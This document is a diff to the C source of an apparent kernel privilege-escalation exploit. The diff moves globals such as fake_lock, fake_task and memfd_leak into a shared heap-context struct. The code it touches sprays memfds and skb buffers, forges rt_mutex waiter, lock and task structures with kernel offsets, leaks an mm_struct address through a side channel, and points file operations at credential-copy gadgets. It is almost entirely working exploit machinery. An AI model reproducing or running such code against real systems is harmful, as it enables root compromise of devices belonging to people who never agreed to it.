@@ -324,9 +324,9 @@ void cleanup_page_prepare_state(void) {
   close_ctx_memfds(&spray_ctx);
   close_ctx_memfds(&pre_ctx);
   close_ctx_memfds(&post_ctx);
-  if (memfd_leak > 0) {
-    close(memfd_leak);
-    memfd_leak = -1;
+  if ((g_heap_context.leak_memfd) > 0) {
+    close((g_heap_context.leak_memfd));
+    (g_heap_context.leak_memfd) = -1;
   }
   free_ctx_storage(&prepare_ctx);
   free_ctx_storage(&spray_ctx);
@@ -379,9 +379,9 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
 
   uintptr_t payload_base = base + payload_delta;
 
-  fake_lock = payload_base + LOCK_OFF;
-  fake_w0 = payload_base + W0_OFF;
-  fake_task = payload_base + fake_task_off;
+  (g_heap_context.current.fake_lock) = payload_base + LOCK_OFF;
+  (g_heap_context.current.fake_w0) = payload_base + W0_OFF;
+  (g_heap_context.current.fake_task) = payload_base + fake_task_off;
   uintptr_t default_fops = payload_base + FOPS_TABLE_OFF;
   uintptr_t credential_fops =
       payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
@@ -390,20 +390,17 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
       resolved_addresses_data_alias(&g_resolved_addresses,
                                     resolved_addresses_init_cred_image(
                                         &g_resolved_addresses)));
-  fake_parent = write_layout.parent;
-  fake_right = write_layout.right;
-  fake_left = write_layout.left;
-  fake_fops = write_layout.fops;
+  (g_heap_context.current.fake_parent) = write_layout.parent;
+  (g_heap_context.current.fake_right) = write_layout.right;
+  (g_heap_context.current.fake_left) = write_layout.left;
+  (g_heap_context.current.fake_fops) = write_layout.fops;
 
-  uintptr_t write_pc = fake_parent;
-  uintptr_t write_right = fake_right;
-  uintptr_t write_left = fake_left;
-  /* Direct-map aliases (data_addr) resolve to the same physical pages and 
-   * are dereferenceable on every SoC — the tcp route already uses SLIDE_INIT_TASK 
-   * the same way for the on-stack waiter. */
-  uint64_t waiter_task = SLIDE_INIT_TASK;
-  uint64_t task_group = SLIDE_ROOT_TASK_GROUP;
-  uint64_t pi_top_task = SLIDE_INIT_TASK;
+  uintptr_t write_pc = (g_heap_context.current.fake_parent);
+  uintptr_t write_right = (g_heap_context.current.fake_right);
+  uintptr_t write_left = (g_heap_context.current.fake_left);
+  uint64_t waiter_task = INIT_TASK;
+  uint64_t task_group = ROOT_TASK_GROUP;
+  uint64_t pi_top_task = INIT_TASK;
 
   const struct kernel_offsets *v = profile_values();
   int compact = target_profile_has_compact_waiter(&g_target_profile);
@@ -412,9 +409,9 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
     unsigned char *p = skb_buf + chunk + chunk_bias;
 
     put32(p, LOCK_OFF + 0x00, 0);
-    put64(p, LOCK_OFF + 0x08, fake_w0);
-    put64(p, LOCK_OFF + 0x10, fake_w0);
-    put64(p, LOCK_OFF + 0x18, fake_task | 1);
+    put64(p, LOCK_OFF + 0x08, (g_heap_context.current.fake_w0));
+    put64(p, LOCK_OFF + 0x10, (g_heap_context.current.fake_w0));
+    put64(p, LOCK_OFF + 0x18, (g_heap_context.current.fake_task) | 1);
 
     if (compact) {
       /* Words ride the erase relink: pc = value, rb_left = dest,
@@ -431,7 +428,7 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
            ghostlock::kCompactWaiterBytes},
           *request, write_layout);
       put64(p, W0_OFF + 0x30, waiter_task); /* task */
-      put64(p, W0_OFF + 0x38, fake_lock);   /* lock */
+      put64(p, W0_OFF + 0x38, (g_heap_context.current.fake_lock));   /* lock */
       put32(p, W0_OFF + 0x40, 0);           /* wake_state */
       put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
       put64(p, W0_OFF + 0x48, 0);           /* deadline */
@@ -449,7 +446,7 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
       put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
       put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
-      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
+      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, (g_heap_context.current.fake_lock));
       put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
       put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
     }
@@ -481,11 +478,11 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
     put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
     put64(p, fake_task_off + ft_pi_blocked_off, 0);
 
-    put64(p, RIGHT_OFF + 0x00, fake_parent);
+    put64(p, RIGHT_OFF + 0x00, (g_heap_context.current.fake_parent));
     put64(p, RIGHT_OFF + 0x08, 0);
     put64(p, RIGHT_OFF + 0x10, 0);
 
-    put64(p, LEFT_OFF + 0x00, fake_parent);
+    put64(p, LEFT_OFF + 0x00, (g_heap_context.current.fake_parent));
     put64(p, LEFT_OFF + 0x08, 0);
     put64(p, LEFT_OFF + 0x10, 0);
 
@@ -546,7 +543,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
   }
-  memfd_leak = open_memfd(child_leak);
+  (g_heap_context.leak_memfd) = open_memfd(child_leak);
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
@@ -625,7 +622,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   uintptr_t leaked = snitch.result();
   /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
   leaked |= (uintptr_t)0xf << 56;
-  last_mm_struct = leaked;
+  (g_heap_context.current.last_mm_struct) = leaked;
   /* mm_structs live in the direct map */
   if (leaked == (uintptr_t)-1 ||
       leaked < KERNELSNITCH_IDENTITY_START ||
@@ -696,8 +693,8 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   sched_yield();
   sched_yield();
   sched_yield();
-  SYSCHK(close(memfd_leak));
-  memfd_leak = -1;
+  SYSCHK_pr(close(g_heap_context.leak_memfd), "SYSCHK(" "close(memfd_leak)" "): %m\n");
+  (g_heap_context.leak_memfd) = -1;
   for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
@@ -739,10 +736,10 @@ uintptr_t prepare_good_kernel_page(const WriteRequest *request) {
     uintptr_t base = prepare_kernel_page(request);
     if (base) {
       PayloadWriteLayout layout = {
-        .parent = fake_parent,
-        .right = fake_right,
-        .left = fake_left,
-        .fops = fake_fops,
+        .parent = (g_heap_context.current.fake_parent),
+        .right = (g_heap_context.current.fake_right),
+        .left = (g_heap_context.current.fake_left),
+        .fops = (g_heap_context.current.fake_fops),
       };
       if (!payload_write_layout_matches_request(request, &layout)) {
         pr_warning("payload arm mismatch preserve_child=%d right=%016zx\n",
